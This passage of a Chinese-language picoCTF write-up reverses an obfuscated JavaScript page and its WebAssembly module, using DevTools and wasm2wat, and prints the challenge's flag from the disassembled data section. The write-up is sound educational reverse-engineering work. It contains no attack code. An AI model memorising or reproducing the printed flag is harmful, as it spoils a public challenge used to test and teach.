}
```

在第 34 行的地方，我們發現這個自執行的匿名函式會打亂一開始的 `strArr` 陣列，所以為了搞清楚每個索引對應到的是甚麼，我們可以用瀏覽器的 Devtools 來幫忙。因為在一開始的代碼裡面，從 `strArr` 裡面找出其中一個元素的函式叫做 `_0x4e0e`，所以可以先幫他取個別名叫 `getStr`，並像下面這樣輸入在 Devtools 的 Console 裡面。之後就可以把每個索引帶進去，找到對應的字串了。

```javascript
>>> const getStr = _0x4e0e;
undefined
>>> getStr(489)
'./JIFxzHyW8W'
>>> getStr(479)
'instantiate'
```

那我們就一個一個找回去，看看代碼會變怎樣。以下是我全部對應完後的代碼。

```javascript
(async () => {
    const func3 = getStr;
    let var1 = await fetch("./JIFxzHyW8W"),
        var2 = await WebAssembly["instantiate"](await var1["arrayBuffer"]()),
        var3 = var2["instance"];
    exports = var3["exports"];
})();
function onButtonPress() {
    const func4 = getStr;
    let var1 = document["getElementById"]("input")["value"];
    for (let i = 0; i < var1["length"]; i++) {
        exports["copy_char"](var1["charCodeAt"](i), i);
    }
    exports["copy_char"](0, var1["length"]),
        exports["check_flag"]() == 1
            ? (document["getElementById"]("result")["innerHTML"] = "Correct!")
            : (document["getElementById"]("result")["innerHTML"] =
                  "Incorrect!");
}
```

這樣我們大概就可以理解這個代碼會把使用者輸入的資訊透過 `copy_char` 傳給 WebAssembly 腳本，然後呼叫 `chech_flag` 來比對 Flag 是否正確，那我們就先來看看第 3 行的地方，他的 WebAssembly 腳本吧。這邊會用到的工具是 [這個](https://github.com/WebAssembly/wabt) 裡面的 `wasm2wat`，作者自己的描述是這樣：

> [**wasm2wat**](https://webassembly.github.io/wabt/doc/wasm2wat.1.html): the inverse of wat2wasm, translate from the binary format back to the text format (also known as a .wat)

照著官方的安裝說明裝好之後，使用以下命令就可以啦。（記得先用 `wget` 把檔案從 `http://mercury.picoctf.net:40226/JIFxzHyW8W` 抓下來）

```bash
~/Tools/wabt/build/wasm2wat JIFxzHyW8W
```

```wasm
(module
  (type (;0;) (func))
  (type (;1;) (func (param i32 i32) (result i32)))
  (type (;2;) (func (result i32)))
  (type (;3;) (func (param i32 i32)))
  (func (;0;) (type 0))
  (func (;1;) (type 1) (param i32 i32) (result i32)
    (local i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32)
    global.get 0
    local.set 2
    i32.const 32
    local.set 3
    local.get 2
    local.get 3
    i32.sub
    local.set 4
    local.get 4
    local.get 0
    i32.store offset=24
    local.get 4
    local.get 1
    i32.store offset=20
    local.get 4
    i32.load offset=24
    local.set 5
    local.get 4
    local.get 5
    i32.store offset=16
    local.get 4
    i32.load offset=20
    local.set 6
    local.get 4
    local.get 6
    i32.store offset=12
    block  ;; label = @1
      loop  ;; label = @2
        local.get 4
        i32.load offset=16
        local.set 7
        i32.const 1
        local.set 8
        local.get 7
        local.get 8
        i32.add
        local.set 9
        local.get 4
        local.get 9
        i32.store offset=16
        local.get 7
        i32.load8_u
        local.set 10
        local.get 4
        local.get 10
        i32.store8 offset=11
        local.get 4
        i32.load offset=12
        local.set 11
        i32.const 1
        local.set 12
        local.get 11
        local.get 12
        i32.add
        local.set 13
        local.get 4
        local.get 13
        i32.store offset=12
        local.get 11
        i32.load8_u
        local.set 14
        local.get 4
        local.get 14
        i32.store8 offset=10
        local.get 4
        i32.load8_u offset=11
        local.set 15
        i32.const 255
        local.set 16
        local.get 15
        local.get 16
        i32.and
        local.set 17
        block  ;; label = @3
          local.get 17
          br_if 0 (;@3;)
          local.get 4
          i32.load8_u offset=11
          local.set 18
          i32.const 255
          local.set 19
          local.get 18
          local.get 19
          i32.and
          local.set 20
          local.get 4
          i32.load8_u offset=10
          local.set 21
          i32.const 255
          local.set 22
          local.get 21
          local.get 22
          i32.and
          local.set 23
          local.get 20
          local.get 23
          i32.sub
          local.set 24
          local.get 4
          local.get 24
          i32.store offset=28
          br 2 (;@1;)
        end
        local.get 4
        i32.load8_u offset=11
        local.set 25
        i32.const 255
        local.set 26
        local.get 25
        local.get 26
        i32.and
        local.set 27
        local.get 4
        i32.load8_u offset=10
        local.set 28
        i32.const 255
        local.set 29
        local.get 28
        local.get 29
        i32.and
        local.set 30
        local.get 27
        local.set 31
        local.get 30
        local.set 32
        local.get 31
        local.get 32
        i32.eq
        local.set 33
        i32.const 1
        local.set 34
        local.get 33
        local.get 34
        i32.and
        local.set 35
        local.get 35
        br_if 0 (;@2;)
      end
      local.get 4
      i32.load8_u offset=11
      local.set 36
      i32.const 255
      local.set 37
      local.get 36
      local.get 37
      i32.and
      local.set 38
      local.get 4
      i32.load8_u offset=10
      local.set 39
      i32.const 255
      local.set 40
      local.get 39
      local.get 40
      i32.and
      local.set 41
      local.get 38
      local.get 41
      i32.sub
      local.set 42
      local.get 4
      local.get 42
      i32.store offset=28
    end
    local.get 4
    i32.load offset=28
    local.set 43
    local.get 43
    return)
  (func (;2;) (type 2) (result i32)
    (local i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32)
    i32.const 0
    local.set 0
    i32.const 1072
    local.set 1
    i32.const 1024
    local.set 2
    local.get 2
    local.get 1
    call 1
    local.set 3
    local.get 3
    local.set 4
    local.get 0
    local.set 5
    local.get 4
    local.get 5
    i32.ne
    local.set 6
    i32.const -1
    local.set 7
    local.get 6
    local.get 7
    i32.xor
    local.set 8
    i32.const 1
    local.set 9
    local.get 8
    local.get 9
    i32.and
    local.set 10
    local.get 10
    return)
  (func (;3;) (type 3) (param i32 i32)
    (local i32 i32 i32 i32 i32)
    global.get 0
    local.set 2
    i32.const 16
    local.set 3
    local.get 2
    local.get 3
    i32.sub
    local.set 4
    local.get 4
    local.get 0
    i32.store offset=12
    local.get 4
    local.get 1
    i32.store offset=8
    local.get 4
    i32.load offset=12
    local.set 5
    local.get 4
    i32.load offset=8
    local.set 6
    local.get 6
    local.get 5
    i32.store8 offset=1072
    return)
  (table (;0;) 1 1 funcref)
  (memory (;0;) 2)
  (global (;0;) (mut i32) (i32.const 66864))
  (global (;1;) i32 (i32.const 1072))
  (global (;2;) i32 (i32.const 1024))
  (global (;3;) i32 (i32.const 1328))
  (global (;4;) i32 (i32.const 1024))
  (global (;5;) i32 (i32.const 66864))
  (global (;6;) i32 (i32.const 0))
  (global (;7;) i32 (i32.const 1))
  (export "memory" (memory 0))
  (export "__wasm_call_ctors" (func 0))
  (export "strcmp" (func 1))
  (export "check_flag" (func 2))
  (export "input" (global 1))
  (export "copy_char" (func 3))
  (export "__dso_handle" (global 2))
  (export "__data_end" (global 3))
  (export "__global_base" (global 4))
  (export "__heap_base" (global 5))
  (export "__memory_base" (global 6))
  (export "__table_base" (global 7))
  (data (;0;) (i32.const 1024) "picoCTF{cb688c00b5a2ede7eaedcae883735759}\00\00"))
```

最後一航就可以看到 Flag 了，這邊就不繼續逆向回去，想繼續的話一樣可以使用這個工具裡面的其他工具去完成。

```txt
picoCTF{cb688c00b5a2ede7eaedcae883735759}
```
